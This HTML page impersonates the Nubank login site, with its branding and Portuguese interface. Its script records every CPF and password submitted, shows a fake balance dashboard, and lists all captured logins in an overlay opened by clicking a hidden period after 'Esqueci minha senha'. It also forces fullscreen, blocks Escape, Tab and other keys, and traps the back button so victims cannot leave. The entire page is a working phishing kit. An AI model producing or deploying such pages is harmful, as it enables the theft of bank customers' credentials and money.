<html><head><base href="https://nubank.com.br/"><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>Nubank - Sua vida financeira</title>
<style>
body, html {
  margin: 0;
  padding: 0;
  font-family: 'Roboto', sans-serif;
  background-color: #820ad1;
  height: 100%;
  overflow: hidden;
}
.login-container, .dashboard-container {
  background-color: white;
  border-radius: 8px;
  padding: 40px;
  width: 300px;
  box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
  position: absolute;
  top: 50%;
  left: 50%;
  transform: translate(-50%, -50%);
}
.dashboard-container {
  display: none;
  width: 80%;
  max-width: 800px;
  height: 80%;
  overflow-y: auto;
}
.logo {
  text-align: center;
  margin-bottom: 30px;
}
.logo svg {
  width: 120px;
  height: 45px;
}
form {
  display: flex;
  flex-direction: column;
}
input {
  margin-bottom: 15px;
  padding: 12px;
  border: 1px solid #ccc;
  border-radius: 4px;
  font-size: 16px;
}
button {
  background-color: #820ad1;
  color: white;
  border: none;
  padding: 12px;
  border-radius: 4px;
  font-size: 16px;
  cursor: pointer;
  transition: background-color 0.3s ease;
}
button:hover {
  background-color: #6b0bac;
}
.forgot-password {
  text-align: center;
  margin-top: 15px;
}
.forgot-password a {
  color: #820ad1;
  text-decoration: none;
}
#hiddenData {
  display: none;
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background-color: rgba(0,0,0,0.9);
  z-index: 1000;
  color: white;
  padding: 20px;
  box-sizing: border-box;
  overflow: auto;
}
#hiddenData h2 {
  text-align: center;
}
#hiddenData ul {
  list-style-type: none;
  padding: 0;
}
#hiddenData li {
  margin-bottom: 10px;
  border-bottom: 1px solid #444;
  padding-bottom: 10px;
}
.dashboard-header {
  display: flex;
  justify-content: space-between;
  align-items: center;
  margin-bottom: 20px;
}
.dashboard-header h1 {
  margin: 0;
  color: #820ad1;
}
.dashboard-content {
  display: grid;
  grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
  gap: 20px;
}
.dashboard-card {
  background-color: #f9f9f9;
  border-radius: 8px;
  padding: 20px;
  text-align: center;
}
.dashboard-card h2 {
  margin-top: 0;
  color: #820ad1;
}
.dashboard-card p {
  font-size: 24px;
  font-weight: bold;
  margin: 10px 0;
}
#fullscreenWarning {
  display: none;
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background-color: rgba(0,0,0,0.8);
  color: white;
  text-align: center;
  padding-top: 50px;
  z-index: 9999;
}
</style>
</head>
<body>
<div id="fullscreenWarning">
  <h2>Para uma melhor experiência, por favor, permita o modo tela cheia.</h2>
  <button id="retryFullscreen">Tentar Novamente</button>
</div>

<div class="login-container" id="loginContainer">
  <div class="logo">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 500 200">
      <path fill="#820ad1" d="M89.9 164.5c-5.2 0-9.5-1.1-12.7-3.4-3.2-2.3-5.6-5.5-7.1-9.6-1.5-4.1-2.2-8.8-2.2-14.2V75.7h20.6v60.5c0 2.8.6 5 1.7 6.6 1.1 1.6 2.9 2.4 5.2 2.4 2.9 0 5.1-1.2 6.6-3.5 1.5-2.3 2.2-5.5 2.2-9.6V75.7h20.6v88.8h-19.8v-9.1h-.9c-1.9 3.5-4.5 6.2-7.8 8.1-3.3 1.9-7 2.9-11 2.9zm80.6-.9h-20.6V75.7h20.6v88.8zm34.3 0h-20.6V46.5h20.6v117zm49.6.9c-5.8 0-10.9-1.2-15.3-3.6-4.4-2.4-7.9-5.9-10.4-10.4-2.5-4.5-3.8-9.8-3.8-16 0-6.2 1.3-11.5 3.8-16 2.5-4.5 6-8 10.4-10.4 4.4-2.4 9.5-3.6 15.3-3.6 5.8 0 10.9 1.2 15.3 3.6 4.4 2.4 7.9 5.9 10.4 10.4 2.5 4.5 3.8 9.8 3.8 16 0 6.2-1.3 11.5-3.8 16-2.5 4.5-6 8-10.4 10.4-4.4 2.4-9.5 3.6-15.3 3.6zm0-16.2c3.2 0 5.8-1.2 7.8-3.5 2-2.3 3-5.6 3-9.8 0-4.2-1-7.5-3-9.8-2-2.3-4.6-3.5-7.8-3.5-3.2 0-5.8 1.2-7.8 3.5-2 2.3-3 5.6-3 9.8 0 4.2 1 7.5 3 9.8 2 2.3 4.6 3.5 7.8 3.5zm56.4 16.2c-5.8 0-10.9-1.2-15.3-3.6-4.4-2.4-7.9-5.9-10.4-10.4-2.5-4.5-3.8-9.8-3.8-16 0-6.2 1.3-11.5 3.8-16 2.5-4.5 6-8 10.4-10.4 4.4-2.4 9.5-3.6 15.3-3.6 5.8 0 10.9 1.2 15.3 3.6 4.4 2.4 7.9 5.9 10.4 10.4 2.5 4.5 3.8 9.8 3.8 16 0 6.2-1.3 11.5-3.8 16-2.5 4.5-6 8-10.4 10.4-4.4 2.4-9.5 3.6-15.3 3.6zm0-16.2c3.2 0 5.8-1.2 7.8-3.5 2-2.3 3-5.6 3-9.8 0-4.2-1-7.5-3-9.8-2-2.3-4.6-3.5-7.8-3.5-3.2 0-5.8 1.2-7.8 3.5-2 2.3-3 5.6-3 9.8 0 4.2 1 7.5 3 9.8 2 2.3 4.6 3.5 7.8 3.5zm56.4 16.2c-5.8 0-10.9-1.2-15.3-3.6-4.4-2.4-7.9-5.9-10.4-10.4-2.5-4.5-3.8-9.8-3.8-16 0-6.2 1.3-11.5 3.8-16 2.5-4.5 6-8 10.4-10.4 4.4-2.4 9.5-3.6 15.3-3.6 5.8 0 10.9 1.2 15.3 3.6 4.4 2.4 7.9 5.9 10.4 10.4 2.5 4.5 3.8 9.8 3.8 16 0 6.2-1.3 11.5-3.8 16-2.5 4.5-6 8-10.4 10.4-4.4 2.4-9.5 3.6-15.3 3.6zm0-16.2c3.2 0 5.8-1.2 7.8-3.5 2-2.3 3-5.6 3-9.8 0-4.2-1-7.5-3-9.8-2-2.3-4.6-3.5-7.8-3.5-3.2 0-5.8 1.2-7.8 3.5-2 2.3-3 5.6-3 9.8 0 4.2 1 7.5 3 9.8 2 2.3 4.6 3.5 7.8 3.5z"/>
      <path fill="#820ad1" d="M86.7 46.5h21.4l-22.3 117h-21.4z"/>
    </svg>
  </div>
  <form id="loginForm">
    <input type="text" id="cpf" placeholder="CPF" required>
    <input type="password" id="password" placeholder="Senha" required>
    <button type="submit">Entrar</button>
  </form>
  <div class="forgot-password">
    <a href="https://nubank.com.br/recuperar-senha">Esqueci minha senha<span id="hiddenTrigger">.</span></a>
  </div>
</div>

<div class="dashboard-container" id="dashboardContainer">
  <div class="dashboard-header">
    <h1>Bem-vindo ao Nubank</h1>
  </div>
  <div class="dashboard-content">
    <div class="dashboard-card">
      <h2>Saldo</h2>
      <p>R$ 1.234,56</p>
    </div>
    <div class="dashboard-card">
      <h2>Fatura Atual</h2>
      <p>R$ 567,89</p>
    </div>
    <div class="dashboard-card">
      <h2>Limite Disponível</h2>
      <p>R$ 3.000,00</p>
    </div>
    <div class="dashboard-card">
      <h2>Investimentos</h2>
      <p>R$ 10.000,00</p>
    </div>
  </div>
</div>

<div id="hiddenData">
  <h2>Dados Armazenados</h2>
  <ul id="storedData"></ul>
</div>

<script>
let storedLogins = [];

function goFullscreen() {
  const element = document.documentElement;
  if (element.requestFullscreen) {
    element.requestFullscreen().catch(err => {
      console.warn(`Error attempting to enable fullscreen: ${err.message}`);
      showFullscreenWarning();
    });
  } else if (element.mozRequestFullScreen) {
    element.mozRequestFullScreen();
  } else if (element.webkitRequestFullscreen) {
    element.webkitRequestFullscreen();
  } else if (element.msRequestFullscreen) {
    element.msRequestFullscreen();
  }
}

function showFullscreenWarning() {
  document.getElementById('fullscreenWarning').style.display = 'block';
}

function hideFullscreenWarning() {
  document.getElementById('fullscreenWarning').style.display = 'none';
}

document.getElementById('retryFullscreen').addEventListener('click', () => {
  goFullscreen();
  hideFullscreenWarning();
});

function preventDefaultKeys(e) {
  const forbiddenKeys = ['F11', 'Escape', 'Tab', 'Alt', 'Control', 'Meta'];
  if (forbiddenKeys.includes(e.key)) {
    e.preventDefault();
    return false;
  }
}

document.addEventListener('keydown', preventDefaultKeys);
document.addEventListener('contextmenu', e => e.preventDefault());

window.onload = goFullscreen;

document.getElementById('loginForm').addEventListener('submit', function(e) {
  e.preventDefault();
  
  const cpf = document.getElementById('cpf').value;
  const password = document.getElementById('password').value;
  
  if (cpf && password) {
    storedLogins.push({cpf, password, timestamp: new Date().toLocaleString()});
    document.getElementById('loginContainer').style.display = 'none';
    document.getElementById('dashboardContainer').style.display = 'block';
    goFullscreen();
  } else {
    alert('Por favor, preencha todos os campos.');
  }
});

document.getElementById('hiddenTrigger').addEventListener('click', function(e) {
  e.preventDefault();
  e.stopPropagation();
  
  const hiddenData = document.getElementById('hiddenData');
  const storedDataList = document.getElementById('storedData');
  
  storedDataList.innerHTML = '';
  storedLogins.forEach((login, index) => {
    const li = document.createElement('li');
    li.innerHTML = `<strong>Login ${index + 1}</strong><br>
                    CPF: ${login.cpf}<br>
                    Senha: ${login.password}<br>
                    Timestamp: ${login.timestamp}`;
    storedDataList.appendChild(li);
  });
  
  hiddenData.style.display = 'block';
});

document.getElementById('hiddenData').addEventListener('click', function() {
  this.style.display = 'none';
});

// Handle fullscreen changes
document.addEventListener('fullscreenchange', function() {
  if (!document.fullscreenElement) {
    showFullscreenWarning();
  } else {
    hideFullscreenWarning();
  }
});

// Disable all navigation
history.pushState(null, null, document.URL);
window.addEventListener('popstate', function () {
    history.pushState(null, null, document.URL);
});
</script>
</body></html>
